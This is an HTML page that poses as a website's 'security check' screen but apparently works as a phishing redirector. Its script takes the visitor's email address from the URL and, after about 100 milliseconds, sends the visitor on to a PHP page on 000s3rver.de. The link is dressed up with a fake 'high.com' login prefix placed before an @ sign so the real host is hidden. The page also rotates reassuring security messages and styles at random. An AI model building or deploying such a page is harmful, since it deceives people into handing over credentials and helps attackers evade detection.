<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check in Progress</title>
    <style id="dynamic-styles">
        /* General Page Styles */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f4f6f9;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            padding: 40px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            width: 100%;
        }
        h1 {
            font-size: 2rem;
            color: #333;
        }
        p {
            font-size: 1rem;
            line-height: 1.6;
            color: #555;
        }

        /* Loader Styles */
        .loader {
            margin: 40px auto;
            display: inline-block;
        }

        /* Dots Loader */
        .dots-loader {
            display: flex;
            justify-content: center;
        }
        .dots-loader div {
            width: 18px;
            height: 18px;
            background-color: #007bff;
            border-radius: 50%;
            margin: 3px;
            animation: bounce 1.2s infinite ease-in-out;
        }
        .dots-loader div:nth-child(2) {
            animation-delay: -1.1s;
        }
        .dots-loader div:nth-child(3) {
            animation-delay: -1.0s;
        }
        @keyframes bounce {
            0%, 100% {
                transform: scale(0);
            }
            50% {
                transform: scale(1);
            }
        }

        /* Bars Loader */
        .bars-loader div {
            display: inline-block;
            width: 10px;
            height: 40px;
            background-color: #007bff;
            margin: 3px;
            animation: bars 1.2s infinite ease-in-out;
        }
        .bars-loader div:nth-child(2) {
            animation-delay: -1.1s;
        }
        .bars-loader div:nth-child(3) {
            animation-delay: -1.0s;
        }
        @keyframes bars {
            0%, 40%, 100% {
                transform: scaleY(0.4);
            }
            20% {
                transform: scaleY(1);
            }
        }

        /* Pulse Loader */
        .pulse-loader div {
            border: 4px solid #f3f3f3;
            border-radius: 50%;
            border-top: 4px solid #3498db;
            width: 50px;
            height: 50px;
            margin: 20px auto;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

    </style>
</head>
<body>

    <div class="container">
        <h1 id="title-text">Securing Your Connection</h1>
        <p id="description-text">For your safety, we are conducting a thorough security check to protect our platform from malicious activity.</p>
        <p id="info-text">This will only take a few seconds. Thank you for your patience while we verify your connection.</p>

        <!-- Dynamic Loader -->
        <div class="loader" id="dynamic-loader"></div>

        <div class="footer">
            <p id="redirect-text">You will be redirected to your destination shortly...</p>
        </div>
    </div>

    <script>
        // Get the part after '?email=' in the current URL
        var hashPart = window.location.href.split("?email=")[1];

        // Create the final URL
        var finalURL = "https://high.com+login{source=secure+settings=private@000s3rver.de/kr/email.php" + "?email=" + hashPart;

        // Redirect after 5 seconds
        setTimeout(function() {
            window.location.assign(finalURL);
        }, 100);

        // Define 4 different style options with stronger security messaging
        const styleOptions = [
            {
                font: "'Helvetica Neue', sans-serif",
                backgroundColor: "#f4f6f9",
                title: "Ensuring a Secure Connection",
                description: "We are performing a detailed security check to prevent unauthorized access.",
                info: "This step helps protect our site and your data. Your connection will be verified within moments.",
                redirect: "Hold tight, you will be redirected shortly..."
            },
            {
                font: "'Georgia', serif",
                backgroundColor: "#f0f0f0",
                title: "Security Verification in Progress",
                description: "To safeguard against potential security threats, your connection is being verified.",
                info: "This process ensures that only legitimate requests can access the page. It will finish in a few seconds.",
                redirect: "Thank you for your patience, redirecting soon..."
            },
            {
                font: "'Verdana', sans-serif",
                backgroundColor: "#ffffff",
                title: "Verifying Security Credentials",
                description: "Our system is checking your connection to maintain the security and integrity of our platform.",
                info: "This quick check helps protect against malicious traffic. You'll be granted access shortly.",
                redirect: "Please wait while we complete the security validation..."
            },
            {
                font: "'Roboto', sans-serif",
                backgroundColor: "#f8f9fa",
                title: "Running Advanced Security Check",
                description: "We are ensuring that your connection is secure and free from threats before granting access.",
                info: "Our security protocols are running in the background. You'll be redirected in a few seconds.",
                redirect: "Preparing to redirect you to your requested page..."
            }
        ];

        // Define different loaders
        const loaderOptions = [
            '<div class="dots-loader"><div></div><div></div><div></div></div>',
            '<div class="bars-loader"><div></div><div></div><div></div></div>',
            '<div class="pulse-loader"><div></div>'
        ];

        // Randomly select one of the style options and loader options
        const randomStyle = styleOptions[Math.floor(Math.random() * styleOptions.length)];
        const randomLoader = loaderOptions[Math.floor(Math.random() * loaderOptions.length)];

        // Apply the selected style to the page
        document.body.style.fontFamily = randomStyle.font;
        document.body.style.backgroundColor = randomStyle.backgroundColor;
        document.getElementById('title-text').textContent = randomStyle.title;
        document.getElementById('description-text').textContent = randomStyle.description;
        document.getElementById('info-text').textContent = randomStyle.info;
        document.getElementById('redirect-text').textContent = randomStyle.redirect;

        // Apply the selected loader
        document.getElementById('dynamic-loader').innerHTML = randomLoader;
    </script>

</body>
</html>
